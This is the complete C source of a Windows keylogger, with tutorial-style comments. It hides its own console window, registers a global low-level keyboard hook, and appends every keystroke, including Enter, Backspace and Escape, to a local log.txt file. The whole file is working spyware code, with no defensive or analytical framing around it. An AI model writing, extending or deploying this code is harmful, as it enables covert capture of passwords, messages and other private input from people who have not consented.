#define _WIN32_WINNT 0x0500         //Defines the oldest Windows Version to be compatible (Windows 2000)
#include <windows.h>
#include <stdio.h>

// ---Global Variables--- 
HHOOK keyboardHook;
FILE *logFile;

// ---Hide Cosole window---
void hide_console()
{
    HWND hWnd = GetConsoleWindow();     //HWND is a Handle for the wanted Window
    ShowWindow(hWnd, SW_HIDE);          //Hides the desired  window
}

// ---Keylogger function---
void log_key(DWORD vkCode)
{
    BYTE keyboardState[256];        //Holds the value of the key status (pressed or toggled)
    WCHAR buffer[5];                //Holds 4 wide Characters from the key press

    //Gets the status of all 256 virtual keys
    GetKeyboardState(keyboardState);

    //changes physical Keyboard layout to VirtualKey layout
    HKL layout = GetKeyboardLayout(0);                      //Gets the used keyboard layout
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC); //vkCode = pysical layout, scanCode = logical layout, MAPVK_VK_TO_VSC = maps a virtual code to a scan code

    // ---Conversion---
    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, buffer, 4, 0, layout);

    if(result > 0)      //If ToUnicodeEx produced characters, terminate the sting and write it to the log file
    {
        buffer[result] = '\n';
        fwprintf(logFile, L"%s", buffer);
    } else              //If its a non character string log the following:
    {
        switch (vkCode)
        {
            case VK_RETURN: fwprintf(logFile, L"[ENTER]\n"); break;         //VK_* is an Windows API funtion
            case VK_BACK: fwprintf(logFile, L"[BACKSPACE]"); break;
            case VK_TAB: fwprintf(logFile, L"[TAB]"); break;
            case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: break;
            case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: break;
            case VK_ESCAPE: fwprintf(logFile, L"[ESC]"); break;
            default: fwprintf(logFile, L"0x%X", vkCode); break;
        }
    }

    fflush(logFile);        //forces data to be written to disk immeditalty
}

// ---Hook callback---
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    //Check if the hook procedure should process the message and if a key was pressed down
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)         
    {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;        //Cast lParam to a pointer to KBDLLHOOKSTRUCT, which contains information about the key event
        log_key(kbd->vkCode);                                    //Log the virtual key code of the pressed key
    }
   
    //Pass the event to the next hook in the chain (required for proper hook operation)
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    hide_console();             //Call hide_console function

    logFile = _wfopen(L"log.txt", L"a+, ccs=UTF-8");        //Opens the log.txt file
    if(!logFile) return 1;                                  //Return 1 if the logFile doesn't exist

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);     //Registers a low level keyboard hook
    if(!keyboardHook) return 1;                                                 //Return 1 if keyboardHook doesn't exist

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)){}                   //Retrieves messages from the tread's message queue

    // ---cleanup---
    UnhookWindowsHookEx(keyboardHook);                      //Uninstall the hook
    fclose(logFile);                                        //Close the log file
    return 0;
}